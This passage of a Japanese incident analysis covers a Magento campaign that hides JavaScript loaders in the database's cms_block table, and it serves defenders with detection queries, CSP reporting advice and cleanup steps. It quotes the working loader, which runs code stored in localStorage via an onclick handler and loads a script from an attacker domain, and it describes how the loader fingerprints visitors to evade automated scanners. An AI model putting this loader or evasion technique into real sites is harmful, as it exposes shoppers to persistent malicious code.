+<section id="s6"><h2>改ざんはファイルではなくデータベースの中にあり、外から見ると清浄に見える<span class="b slot">原因・手口</span></h2><p>仕込み先は Magento の <strong><code>cms_block</code> テーブル</strong>である（出典1）。eComscan はキャンペーン全体で<strong>148のサーバインストール</strong>でここに見つけ、<strong><code>core_config_data</code> やテーマファイルでは一度も見つけていない</strong>（出典1）。</p>
+<p><strong>この置き場所の選択が、2つの検知手段を同時に外している</strong>（本記録の評価）。</p>
+<ol>
+<li><strong>ファイルの完全性チェックに映らない。</strong> ファイルは変わらない。</li>
+<li><strong>外部からの取得に映らない。</strong> 10月23日版のローダーは訪問者のブラウザを指紋採取し、自動化ブラウザには何も返さない（出典1）。</li>
+</ol>
+<p>2点目は実測されている。</p>
+<blockquote>
+<p>「urlscan.io が自動化 Chrome で感染店舗を読み込んだとき、HTTP 200 が返り、Sansec はページに追加された内容を見つけられなかった」（出典1。原文英語。訳は本記録）</p>
+</blockquote>
+<p><strong>つまり「サイトを外からスキャンして清浄」という報告は、本件については何も言っていない</strong>（本記録の評価）。残る手段は2つに絞られる——<strong>サーバ側（データベースの中身）を見ることと、実際の訪問者のブラウザから報告を受け取ること</strong>である。</p>
+<p>後者が CSP（Content-Security-Policy）の違反報告であり、Sansec Watch は <code>additionalver.com</code> について<strong>約52,000件</strong>の報告を受けている（出典1）。<strong>訪問者のブラウザだけが見ている事実を、店舗側へ戻す経路である</strong>（本記録の整理）。</p></section>
+<section id="s7"><h2>スクリプトを消しても、訪問者の端末では動き続ける<span class="b slot">再発防止</span></h2><p>10月初版のローダーは、2つのスクリプトに分かれている（出典1）。</p>
+<pre><code class="language-javascript">&lt;script&gt;!function(){try{var c=localStorage.getItem(&quot;fpCode&quot;);
+if(c){var e=document.createElement(&quot;div&quot;);e.setAttribute(&quot;onclick&quot;,c);
+document.documentElement.appendChild(e);e.click();e.remove()}}catch(e){}}();&lt;/script&gt;
+&lt;script src=&quot;https://deepveindrilling.com/?s=d35c5031&quot;&gt;&lt;/script&gt;
+</code></pre>
+<p>1つ目は訪問者の <code>localStorage</code> から <code>fpCode</code> を読み、値があれば不可視の <code>div</code> の <code>onclick</code> 属性に入れてクリックする（出典1）。<strong>ブラウザがイベントハンドラとして実行するので <code>eval()</code> を通らない</strong>（出典1）。</p>
+<p><strong>結果として、ペイロードは訪問者の端末に残る。</strong></p>
+<blockquote>
+<p>「一度ペイロードを受け取った訪問者は、ドメインが止まっていても遮断されていても、以後のページ表示のたびにそれを実行する」（出典1。原文英語。訳は本記録）</p>
+</blockquote>
+<p><strong>2026年3月版は一度実行すると保存した値を消していた</strong>（出典1）。<strong>10月版は消さない</strong>——<strong>つまり作り手は、意図してこの挙動に変えている</strong>（本記録の評価）。</p>
+<p>店舗側の復旧に関して、出典1 は2点を明示している（出典1）。</p>
+<ul>
+<li><strong>スクリプトを消しても、攻撃者のデータベースへの書き込み権限は残る。</strong></li>
+<li><strong>削除後は、店舗側で <code>fpCode</code> を読むものは無くなる</strong>（＝新しい訪問者には配られなくなる）。</li>
+</ul>
+<p><strong>既にペイロードを受け取った訪問者の端末は、店舗側の清掃では戻らない</strong>（出典1 の記述に基づく本記録の整理）〈未確定2〉——<strong>その人数は公表されていない。</strong></p></section>
+<section id="s8"><h2>ドメインは手放されたあとも読み込まれ続けている<span class="b slot">評価・解釈</span></h2><p>5つのドメインの経過には、見落としやすい事実がある（出典1）。</p>
+<table>
+<thead>
+<tr>
+<th>ドメイン</th>
+<th>登録</th>
+<th>最初に店舗で確認</th>
+<th>店舗数</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>manulfie.click</td>
+<td>2025年7月以前・2026年5月23日に再登録</td>
+<td>2025年7月9日</td>
+<td>863</td>
+</tr>
+<tr>
+<td>neswnsssn.click</td>
+<td>2025年12月以前・2026年5月22日に再登録</td>
+<td>2025年12月12日</td>
+<td>494</td>
+</tr>
+<tr>
+<td>lanhd6549tdhse.top</td>
+<td>2026年3月25日</td>
+<td>2026年3月30日</td>
+<td>355</td>
+</tr>
+<tr>
+<td>additionalver.com</td>
+<td>2026年6月7日</td>
+<td>2026年6月8日</td>
+<td>246</td>
+</tr>
+<tr>
+<td>deepveindrilling.com</td>
+<td>2026年10月6日</td>
+<td>2026年10月7日</td>
+<td>83</td>
+</tr>
+</tbody>
+</table>
+<p><strong>店舗数は重複しうるので、単純合計（2,041）には意味が無い</strong>（出典1。本記録の明示）。累計は953店舗である。</p>
+<p>見落としやすいのは、<strong>最初の2つが失効し、2026年5月に再登録されてドメインパーキング業者のネームサーバを使っている</strong>という点である（出典1）。それでも——</p>
+<blockquote>
+<p>「2026年8月から10月のあいだ、Sansec は <code>manulfie.click</code> のローダーをなお9店舗で、<code>neswnsssn.click</code> のローダーを6店舗で見つけた。それらの店舗の訪問者は、リファラとページタイトルを新しいドメイン所有者へ送り、ブラウザはそこが返す任意のスクリプトを実行する」（出典1。原文英語。訳は本記録）</p>
+</blockquote>
+<p><strong>掃除されなかった店舗は、攻撃者が去ったあとも、ドメインを買った誰かに訪問者を引き渡し続ける</strong>（本記録の評価）。<strong>これは本件固有の話ではない</strong>——<strong>外部ドメインを読み込むコードが自社サイトに残っている限り、そのドメインの所有者が変わった時点でリスクの持ち主も変わる</strong>（本記録の評価。[[INC-2026-0171]] の形に近い）。</p></section>
+<div class="blk " id="s9"><h3>事案の詳細</h3><div class=twrap><table class="g dt"><tbody><tr><th>injection_point</th><td>**Magento の `cms_block` テーブルの `content` 列**（出典1） ——**店頭ページへ描画される静的ブロックである。** **eComscan はキャンペーン全体で148のサーバインストールでここに見つけており、 `core_config_data` やテーマファイルでは一度も見つかっていない**（出典1）。 **`cms_page` も同じ方法で確認すべき対象として挙げられている**（出典1）。</td></tr><tr><th>loader_behavior</th><td>**10月初版は2つのスクリプトからなる**（出典1）。 **①訪問者の `localStorage` から `fpCode` を読み、値があれば不可視の `div` の `onclick` 属性に入れてクリックする**——**ブラウザがイベントハンドラとして実行するため `eval()` を通らない**（出典1）。 **②`deepveindrilling.com/?s=d35c5031` を読み込む。** **ブロックの中に `fpCode` を書く処理は無いので、値を書くのはローダー側である**（出典1）。 **一度ペイロードを受け取った訪問者は、以後ドメインが止まっても遮断されても、 ページを見るたびに同じコードを実行し続ける**（出典1）〈重要〉 ——**2026年3月版は一度実行すると保存した値を消していた**（出典1）。</td></tr><tr><th>fingerprinting</th><td>**2026年10月23日版は、素のスクリプトタグをインラインのローダーに置き換え、 `https://deepveindrilling.com/?s=49b7ca5f&amp;fp=` へブラウザの指紋を送る**（出典1）。 **自動化ブラウザの判定に `navigator.webdriver`・Selenium のグローバル変数・ ChromeDriver の `cdc_` プロパティを使い、 さらに WebGL の GPU 名・CPU コア数・メモリ・画面サイズ・タイムゾーン・ 言語・クライアントヒントを集める**（出典1）。 **サーバは指紋に応じて応答を選ぶ**（出典1）。</td></tr><tr><th>緩和策</th><td><div class=sub><b>手順:</b> **`cms_block` と `cms_page` の `content` を `%fpCode%`・`%se_referrer%`・`%localStorage.getItem%` で検索する** （出典1）。**ドメインは base64 で符号化されていることが多いため、 ドメイン名ではなくコードの型で探す**（出典1）。 **テーブル接頭辞を使っている場合は付ける**（出典1）。　<b>副作用:</b> **`update_time` で攻撃者の最後の書き込み時刻が分かる**（出典1） ——**この値は調査の起点になるため、削除の前に記録しておくこと**（本記録の注意）。</div><div class=sub><b>手順:</b> **侵入に使われた不備・バックドアを探す**—— `pub/media/custom_options/`・`pub/media/customer_address/` の `.htaccess` 以外のファイル、`accesson.php`、 `admin_user` の見覚えのないアカウント、不審なプロセス（出典1）。　<b>副作用:</b> **スクリプトを消しただけでは攻撃者のデータベースへの書き込み権限は残る** （出典1）〈重要〉——**「消して終わり」にすると数日で元に戻る**（本記録の評価）。</div><div class=sub><b>手順:</b> **清掃後にデータベース・管理画面・API 連携のパスワードを変更し、 APSB26-73（PolyShell）と APSB25-88（SessionReaper）を適用する**（出典1）。　<b>副作用:</b> **パスワードの一斉変更は API 連携の停止を招きうる**（本記録の評価） ——**連携先の一覧を先に作ってから実施すること。** **なお本件は「パッチだけでは足りない」事例であり、 パッチの適用をもって完了としないこと**（本記録の明示）。</div></td></tr><tr><th>悪用の有無</th><td><b>状況:</b> 確認されていない　<b>時点:</b> 2026年10月27日　<b>根拠:</b> **Sansec の観測（eComscan・自前クローラ・Sansec Watch）に基づく**（出典1）。　<b>補足:</b> **「最終ペイロードを捕まえていない」ため、 訪問者に何が起きたかは確認されていない**（出典1）。 **「被害が無かったことが確認された」ではない**（本記録の明示） ——**2025年12月には実際の訪問者への配信記録があり**（出典1）、 **一度ペイロードを受けた訪問者はその後も実行し続ける**（出典1）。　<b>出典:</b> 1</td></tr><tr><th>ログの有無</th><td>**店舗側に残るのは `cms_block.content` の `update_time`（攻撃者の最後の書き込み時刻） である**（出典1）。 **訪問者側で何が実行されたかの記録は、CSP 違反報告を集めていない店舗には残らない** （本記録の評価）——**Sansec Watch が約52,000件の報告を受けられたのは、 監視を入れていた店舗があったからである**（出典1）。</td></tr></tbody></table></div></div>
+<div class="blk " id="s10"><h3>経過</h3><div class=twrap><table class=g><tbody><tr><td class="sm nowrap tw">2025年7月9日</td><td class=nowrap><span class="b kind">発生</span></td><td>**最初の店舗が `manulfie.click` のローダーを読み込む**（出典1）。 **キャンペーンの起点である。**</td></tr><tr><td class="sm nowrap tw">2025年12月12日</td><td class=nowrap><span class="b kind">発生</span></td><td>**攻撃者が `neswnsssn.click` へ乗り換える**（出典1）。 **同日、感染店舗にログインした顧客へ `manulfie.click` 経由で `crypto-insider.top/ssl/` のスクリプトが配信され、 5分後に `leqdger.click/ssl/` が続いた**（出典1） ——**Sansec Watch が捉えた、実際の訪問者への配信記録である。**</td></tr><tr><td class="sm nowrap tw">2026年3月30日</td><td class=nowrap><span class="b kind">発生</span></td><td>**PolyShell（CVE-2026-48356）による一斉攻撃**—— **1時間で471店舗へ `lanhd6549tdhse.top` のローダーが仕込まれた**（出典1）。 **ウェブシェルを置いたうえでの書き込みである**（出典1）。</td></tr><tr><td class="sm nowrap tw">2026年6月8日</td><td class=nowrap><span class="b kind">発生</span></td><td>**`additionalver.com` へ乗り換える**（出典1）。 **この時期のローダーは広告配信ツール Keitaro の「Script (async)」連携の形を とっており、訪問者ごとに配信・転送・無反応を振り分けていた**（出典1）。</td></tr><tr><td class="sm nowrap tw">2026年9月16日</td><td class=nowrap><span class="b kind">検知</span></td><td>**後にパッチ済みで感染する店舗で、eComscan が不正な管理者アカウントを検出** （出典1）。**9月24日には GSocket バックドアも検出している**（出典1）。</td></tr><tr><td class="sm nowrap tw">2026年10月6日</td><td class=nowrap><span class="b kind">発生</span></td><td>**`deepveindrilling.com` が登録される**（出典1）。 **翌夜には最初の店舗が読み込み始めた**（出典1）。</td></tr><tr><td class="sm nowrap tw">2026年10月7日 21:54 UTC</td><td class=nowrap><span class="b kind">検知</span></td><td>**eComscan が新しいローダーを初めて検出**（出典1）。 **10月8日の終わりまでに Sansec のクローラが74店舗で見つけた**（出典1）。</td></tr><tr><td class="sm nowrap tw">2026年10月23日 16:46 UTC</td><td class=nowrap><span class="b kind">発生</span></td><td>**コアパッチの欠けが無い Magento 2.4.7-p10 の店舗が `deepveindrilling.com` を読み込む**（出典1） ——**清浄と判定されたスキャンの1時間後である**〈重要〉。 **同日、攻撃者はブロックを書き換えて指紋採取版のローダーに差し替え、 さらに9店舗へ広がった**（出典1）。</td></tr><tr><td class="sm nowrap tw">2026年10月24日</td><td class=nowrap><span class="b kind">調査報告書の公表</span></td><td>**Sansec が調査結果を公表**（出典1）。 **再クロールした71店舗はすべて新版を走らせていた**（出典1）。 **`additionalver.com` のスクリプトを Windows デスクトップの訪問者として 要求したところ、何もしない文（`QWE=123;`）と24時間有効の目印の クッキーが返った**（出典1）。</td></tr><tr><td class="sm nowrap tw">2026年10月26日</td><td class=nowrap><span class="b kind">報道・レポート公開</span></td><td>**SecurityWeek が報道**（出典2）。**本記録の起点である。**</td></tr></tbody></table></div></div>
+<div id="s11"><div class="box disc"><div class=bt>資料間の食い違い・留保<span class=bc>4</span></div><ul><li><span class="b dk">当事者の公表なし</span><span class=ui>Adobe 自身の公表</span><div class=sm>**出典1 は修正として APSB26-73（PolyShell）と APSB25-88（SessionReaper）を 挙げているが、本記録は Adobe の該当文書を直接取得していない。** **したがって、各 APSB の対象バージョン・公開日・記載内容は検証していない。** **Adobe 自身が本キャンペーンについて何か述べているかも確認できていない。**</div></li><li><span class="b dk">裏取りできていない</span><span class=ui>本記録が検証していない指標（IoC）</span><div class=sm>**本記録に記載した指標（ローダー URL・Keitaro URL・ペイロード URL・ `localStorage` のキー・base64 文字列）は、 出典1 が公表したものをそのまま写したものである。** **本記録はこれらを独自に検証していない** ——**照合先のテレメトリを持たないため、 本記録の記載を根拠に検知を組まないこと**（本記録の明示）。</div></li><li><span class="b dk">単位・母数の曖昧さ</span><span class=ui>「953店舗」という値の性質</span><div class=sm>**953は2025年7月以降の累計であり、 「いま感染している店舗の数」ではない**（出典1。本記録の明示）。 **また店舗の数であって事業者の数でもサーバの数でもない** ——**eComscan が `cms_block` でローダーを見つけたのは 148のサーバインストールである**（出典1）。 **ドメイン別の店舗数（863／494／355／246／83）は重複しうるため 単純合計できない**（出典1 が明示）。</div></li><li><span class="b dk">発表・報道間の食い違い</span><span class=ui>2026年3月の一斉攻撃の日付の表記</span><div class=sm>**報道（出典2）は「In March, 471 Magento stores were injected」とのみ記す。** **出典1 の年表は2026年3月30日である**（本記録の確認）。 **内容の食い違いではなく、粒度の違いである**（本記録の整理） ——**本記録は出典1 の日付を採った。**</div></li></ul></div></div>
+<div class="part p2" id="part2"><div class="ph"><span class="pn">Part 2</span>ここから学べること</div><div class="pd">上の事実をもとにした本記録の評価・示唆です。<b>当事者が述べたことではありません。</b>読者は日本の CISO・セキュリティ技術者を想定しています。</div></div>
+<div class="blk " id="s12"><h3>波及の構造</h3><div class="blknote">事案の構造を図にしたものです。数値は公表値に基づきます。</div><div class=dia><div class=diat>パッチは1段目にしか効かない——残された権限から、データベースへ、訪問者のブラウザへ</div><div class=svgwrap><svg viewBox="0 0 2018 222" width="100%" preserveAspectRatio="xMidYMid meet" role="img"><path d="M166,111.0 C193.0,111.0 193.0,111.0 220,111.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M370,111.0 C397.0,111.0 397.0,111.0 424,111.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M574,111.0 C601.0,111.0 601.0,111.0 628,111.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M778,111.0 C805.0,111.0 805.0,111.0 832,111.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M982,111.0 C1009.0,111.0 1009.0,111.0 1036,111.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M1186,111.0 C1213.0,111.0 1213.0,67.0 1240,67.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M1390,67.0 C1315.0,67.0 1315.0,162.0 1240,162.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M1390,67.0 C1417.0,67.0 1417.0,111.0 1444,111.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M1594,111.0 C1621.0,111.0 1621.0,60.0 1648,60.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M1798,60.0 C1723.0,60.0 1723.0,162.0 1648,162.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M1594,111.0 C1723.0,111.0 1723.0,111.0 1852,111.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><rect x="16" y="79.0" width="150" height="64" rx="6" fill="#1a1d27" stroke="#f48fb1" stroke-width="1.4"/><text x="91.0" y="101.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">攻撃者（名称・帰属は非公</text><text x="91.0" y="115.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">表／Sansec は c</text><text x="91.0" y="129.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">riminal gro…</text><rect x="220" y="67.0" width="150" height="88" rx="6" fill="#1a1d27" stroke="#f48fb1" stroke-width="1.4"/><text x="295.0" y="89.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">PolyShell（CV</text><text x="295.0" y="103.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">E-2026-48356</text><text x="295.0" y="117.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">）／SessionRe…</text><text x="295.0" y="130.0" text-anchor="middle" fill="#f48fb1" font-size="10">ファイルアップロードの不</text><text x="295.0" y="142.0" text-anchor="middle" fill="#f48fb1" font-size="10">備。パッチ（APSB26</text><rect x="424" y="79.0" width="150" height="64" rx="6" fill="#1a1d27" stroke="#f48fb1" stroke-width="1.4"/><text x="499.0" y="101.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">ウェブシェル（PNG を</text><text x="499.0" y="115.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">装い pub/media</text><text x="499.0" y="129.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">/custom_opt…</text><rect x="628" y="67.0" width="150" height="88" rx="6" fill="#1a1d27" stroke="#f48fb1" stroke-width="1.4"/><text x="703.0" y="89.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">不正な管理者アカウント／</text><text x="703.0" y="103.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">GSocket バックド</text><text x="703.0" y="117.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">ア</text><text x="703.0" y="130.0" text-anchor="middle" fill="#f48fb1" font-size="10">パッチでは消えない。9月</text><text x="703.0" y="142.0" text-anchor="middle" fill="#f48fb1" font-size="10">16日・9月24日に検出</text><rect x="832" y="67.0" width="150" height="88" rx="6" fill="#1a1d27" stroke="#ffcc80" stroke-width="1.4"/><text x="907.0" y="89.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">Magento のデータ</text><text x="907.0" y="103.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">ベース（cms_bloc</text><text x="907.0" y="117.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">k.content /…</text><text x="907.0" y="130.0" text-anchor="middle" fill="#ffcc80" font-size="10">ファイルは無改変。完全性</text><text x="907.0" y="142.0" text-anchor="middle" fill="#ffcc80" font-size="10">チェックに映らない（出典</text><rect x="1036" y="79.0" width="150" height="64" rx="6" fill="#1a1d27" stroke="#64b5f6" stroke-width="1.4"/><text x="1111.0" y="101.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">感染店舗の店頭ページ（9</text><text x="1111.0" y="115.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">53店舗・ほとんどが M</text><text x="1111.0" y="129.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">agento）</text><rect x="1240" y="23.0" width="150" height="88" rx="6" fill="#1a1d27" stroke="#64b5f6" stroke-width="1.4"/><text x="1315.0" y="45.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">ローダードメイン（5件・</text><text x="1315.0" y="59.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">数か月ごとに乗り換え／C</text><text x="1315.0" y="73.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">loudflare の…</text><text x="1315.0" y="86.0" text-anchor="middle" fill="#64b5f6" font-size="10">front page は</text><text x="1315.0" y="98.0" text-anchor="middle" fill="#64b5f6" font-size="10">404。感染店舗の訪問者</text><rect x="1240" y="125.0" width="150" height="74" rx="6" fill="#1a1d27" stroke="#8892b0" stroke-width="1.4"/><text x="1315.0" y="147.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">自動化ブラウザ・セキュリ</text><text x="1315.0" y="161.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">ティスキャナ</text><text x="1315.0" y="174.0" text-anchor="middle" fill="#8892b0" font-size="10">指紋採取でふるい落とされ</text><text x="1315.0" y="186.0" text-anchor="middle" fill="#8892b0" font-size="10">、何も返らない（出典1）</text><rect x="1444" y="88.0" width="150" height="46" rx="6" fill="#1a1d27" stroke="#8892b0" stroke-width="1.4"/><text x="1519.0" y="110.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">実際の訪問者（買い物客）</text><rect x="1648" y="16.0" width="150" height="88" rx="6" fill="#1a1d27" stroke="#ffcc80" stroke-width="1.4"/><text x="1723.0" y="38.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">訪問者の localSt</text><text x="1723.0" y="52.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">orage（キー fpC</text><text x="1723.0" y="66.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">ode）</text><text x="1723.0" y="79.0" text-anchor="middle" fill="#ffcc80" font-size="10">一度受け取ると、ドメイン</text><text x="1723.0" y="91.0" text-anchor="middle" fill="#ffcc80" font-size="10">が止まっても実行を続ける</text><rect x="1648" y="118.0" width="150" height="88" rx="6" fill="#1a1d27" stroke="#ffcc80" stroke-width="1.4"/><text x="1723.0" y="140.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">ペイロード（未捕捉。過去</text><text x="1723.0" y="154.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">は Ledger を模し</text><text x="1723.0" y="168.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">た暗号資産系サイト）</text><text x="1723.0" y="181.0" text-anchor="middle" fill="#ffcc80" font-size="10">Sansec は最終ペイ</text><text x="1723.0" y="193.0" text-anchor="middle" fill="#ffcc80" font-size="10">ロードをまだ捕まえていな</text><rect x="1852" y="67.0" width="150" height="88" rx="6" fill="#1a1d27" stroke="#ffcc80" stroke-width="1.4"/><text x="1927.0" y="89.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">CSP 違反報告（San</text><text x="1927.0" y="103.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">sec Watch・約5</text><text x="1927.0" y="117.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">2,000件）</text><text x="1927.0" y="130.0" text-anchor="middle" fill="#ffcc80" font-size="10">訪問者側しか見ていない事</text><text x="1927.0" y="142.0" text-anchor="middle" fill="#ffcc80" font-size="10">実が店舗側へ届く経路（出</text></svg></div><div class=fn>Sansec が示した手口を攻撃経路として描いた図である（出典1。整理は本記録）。 **点線は、パッチ適用によって閉じる経路である**（本記録の評価） ——**実線の経路はパッチでは閉じない。** **被害店舗の名称・国は公表されていない**〈未確定1〉。</div></div></div>
+<div class="blk " id="s13"><h3>どこで止められたか</h3><div class="blknote">段階ごとに検知の機会があったか、どの対策があれば効きえたかを整理したものです。「効きえた対策」は本記録の評価であり、当事者が述べたものではありません。</div><div class=twrap><table class=g><thead><tr><th>段階</th><th>検知の機会</th><th>効きえた対策</th></tr></thead><tbody><tr><td class=nowrap><span class="b stage">初期侵入</span></td><td><span class="b do">機会はあったが検知できず</span><div class=sm>**`pub/media/custom_options/`・`pub/media/customer_address/` に `.htaccess` 以外のファイルが現れること自体が異常である**（出典1 の確認手順）。 **この2つのディレクトリの監視は実装可能である**（本記録の評価）。</div></td><td><span class=sm>—</span></td></tr><tr><td class=nowrap><span class="b stage">永続化</span></td><td><span class="b do">検知した</span><div class=sm>**実際に9月16日と9月24日に検出されている**（出典1）〈重要〉。 **検出はできていて、無効化が済んでいなかった**（本記録の評価） ——**10月23日の書き込みは、その1か月後である。**</div></td><td><span class=sm>—</span></td></tr><tr><td class=nowrap><span class="b stage">実行</span></td><td><span class="b do">機会はあったが検知できず</span><div class=sm>**`cms_block.update_time` の変化は検知の起点になる**（出典1 の確認手順）。 **店頭の静的ブロックが更新される頻度は低いので、 更新の監視は現実的である**（本記録の評価）。</div></td><td><span class=sm>—</span></td></tr><tr><td class=nowrap><span class="b stage">検知回避</span></td><td><span class="b do">現実的な検知機会なし</span><div class=sm>**外からページを取得して確かめる方法では原理的に見えない**（本記録の評価）。 **見えるのは、サーバ側（データベース）と、 実際の訪問者のブラウザからの報告（CSP）である**（出典1 の手段に基づく）。</div></td><td><span class=sm>—</span></td></tr><tr><td class=nowrap><span class="b stage">影響（暗号化・破壊・改ざん）</span></td><td><span class="b do">機会はあったが検知できず</span><div class=sm>**CSP（Content-Security-Policy）の違反報告を集めていれば、 訪問者のブラウザが知らないドメインを読み込んだ事実が店舗側に届く** （出典1。Sansec Watch は約52,000件を受けている）。 **これは実装可能で、しかも本件の形に当たる数少ない検知手段である** （本記録の評価）。</div></td><td><span class=sm>—</span></td></tr></tbody></table></div></div>
+<div class="blk " id="s14"><h3>対応の評価</h3><div class="blknote">評価材料がない判断は「評価材料なし」としています。結果論で断じないための区分です。</div><div class="absent">対応の巧拙を評価できる材料が公表資料から得られていません。</div></div>
+<div id="s15"><div class=less><div class=lesst>CISO・経営層への示唆</div><ul><li><div class=lp>「パッチ適用率」は、侵害後の店舗の状態を表さない。完了条件に権限の棚卸しを入れる。</div><div class=lw>**コアパッチの欠けが無い Magento 2.4.7-p10 の店舗が、 清浄判定の1時間後にローダーを読み込んだ**（出典1）。 **その店舗では1か月前に不正な管理者アカウントとバックドアが 検出されていた**（出典1）。 **脆弱性管理の指標はこの店舗を「対応済み」と数える**（本記録の評価）。</div><div class=la><b>取るべき行動</b> **侵害が疑われた資産について、「パッチ適用」と「権限・裏口の無効化」を 別の完了条件として管理する。** **後者の完了は、管理者アカウント一覧・API 連携の鍵・常駐プロセスの 3点を人が確認した記録をもって判定する**（出典1 の確認手順に基づく）。</div></li><li><div class=lp>外部からのスキャン結果を「清浄の証拠」として受け取らない。</div><div class=lw>**10月23日版のローダーは自動化ブラウザをふるい分け、 urlscan.io の自動化 Chrome には追加内容を返さなかった**（出典1）。 **外からページを取得する検査では、原理的に見えない**（本記録の評価）。</div><div class=la><b>取るべき行動</b> **委託先・自社のサイト健全性チェックが「外からの取得」だけで 成り立っていないかを確認する。** **サーバ側（データベースの内容）と訪問者側（CSP 違反報告）の 2方向を足す**（出典1 の手段に基づく）。</div></li><li><div class=lp>EC サイトの改ざんは、自社の損失ではなく顧客の損失として現れる。</div><div class=lw>**ローダーが動くのは訪問者のブラウザである**（出典1）。 **2025年12月12日には、感染店舗にログインした顧客へ Ledger を模したドメインのスクリプトが配信された**（出典1）。 **一度受け取った訪問者は、店舗を掃除しても実行を続ける**（出典1）。</div><div class=la><b>取るべき行動</b> **改ざんが見つかったときの対応手順に「訪問者への告知」を明記する。** **本件の形では、ブラウザのデータ（`localStorage`）を消すまで 訪問者側の実行が止まらない**（出典1 の記述に基づく本記録の整理） ——**告知の内容に、その操作を含める必要がある。**</div></li><li><div class=lp>自社サイトが読み込んでいる外部ドメインの一覧を、資産として持つ。</div><div class=lw>**失効して2026年5月に再登録された2ドメインのローダーが、 2026年8月〜10月にもなお9店舗・6店舗で動いていた**（出典1）。 **訪問者はリファラとページタイトルを新しい所有者へ送り、 返ってきた任意のスクリプトを実行する**（出典1）。</div><div class=la><b>取るべき行動</b> **自社サイトが読み込む外部ドメインを棚卸しし、 「意図して読み込んでいるもの」の一覧（許可リスト）を作る。** **一覧に無いドメインの読み込みを CSP の報告で検出できる状態にする。**</div></li></ul></div></div>
+<div id="s16"><div class=less><div class=lesst>セキュリティ技術者への示唆</div><ul><li><div class=lp>改ざんの探索対象に `cms_block` / `cms_page` を入れる。ファイルだけでは見えない。</div><div class=lw>**eComscan は148のサーバインストールの `cms_block` でローダーを見つけ、 `core_config_data` やテーマファイルでは一度も見つけていない**（出典1）。 **ファイルは変わらないので、完全性チェックには映らない**（本記録の評価）。</div><div class=la><b>取るべき行動</b> **次の検索を定期実行する**（出典1 の手順。テーブル接頭辞があれば付ける）。 `SELECT block_id, identifier, update_time FROM cms_block WHERE content LIKE &#x27;%fpCode%&#x27; OR content LIKE &#x27;%se_referrer%&#x27; OR content LIKE &#x27;%localStorage.getItem%&#x27;;` **同じ検索を `cms_page` にも行う。** **ドメイン名ではなくコードの型で探す**——**ドメインは base64 で 符号化されていることが多い**（出典1）。</div></li><li><div class=lp>ファイルアップロードの置き場に、ファイルが増えていないかを見る。</div><div class=lw>**PolyShell のウェブシェルは PNG 画像を装って `pub/media/custom_options/quote/` に置かれていた**（出典1）。 **ローダーを持つ Magento 2 の169インストールのうち102件（60%）に PolyShell か SessionReaper 経由のアップロードファイルがあった**（出典1）。</div><div class=la><b>取るべき行動</b> **`find pub/media/custom_options/ pub/media/customer_address/ -type f ! -name &#x27;.htaccess&#x27;` と `find . -name &#x27;accesson.php&#x27; -type f` を定期実行し、 結果が空でないことを異常として扱う**（出典1 の手順）。 **拡張子ではなく「そこにファイルがあること」を異常とする**（本記録の整理）。</div></li><li><div class=lp>CSP の違反報告を受け取る口を作る。訪問者側しか見ていない事実が届く。</div><div class=lw>**Sansec Watch は `additionalver.com` の読み込みについて 約52,000件の報告を受けている**（出典1）。 **店舗側のログには、訪問者のブラウザが何を読み込んだかは残らない** （本記録の評価）。</div><div class=la><b>取るべき行動</b> **`Content-Security-Policy-Report-Only` と `report-uri`/`report-to` を設定し、 自社サイトから出る外部ドメインの読み込みを集計する。** **遮断は後でよい——まず見えるようにする**（本記録の整理）。</div></li><li><div class=lp>清掃の完了条件に、データベース・管理画面・API 連携の資格情報の変更を含める。</div><div class=lw>**「スクリプトを消しても、攻撃者のデータベースへの書き込み権限は残る」** （出典1。原文英語。訳は本記録）。 **残っていれば、同じ書き込みが繰り返される**（本記録の評価）。</div><div class=la><b>取るべき行動</b> **①`cms_block.update_time` を記録 → ②スクリプトを削除 → ③アップロード経路とバックドアの探索 → ④`admin_user` の精査 → ⑤データベース・管理画面・API 連携のパスワード変更 → ⑥APSB26-73 / APSB25-88 の適用、の順で行う**（出典1 の手順。整理は本記録）。 **①を飛ばすと、攻撃者の最後の書き込み時刻という調査の起点を失う。**</div></li></ul></div></div>
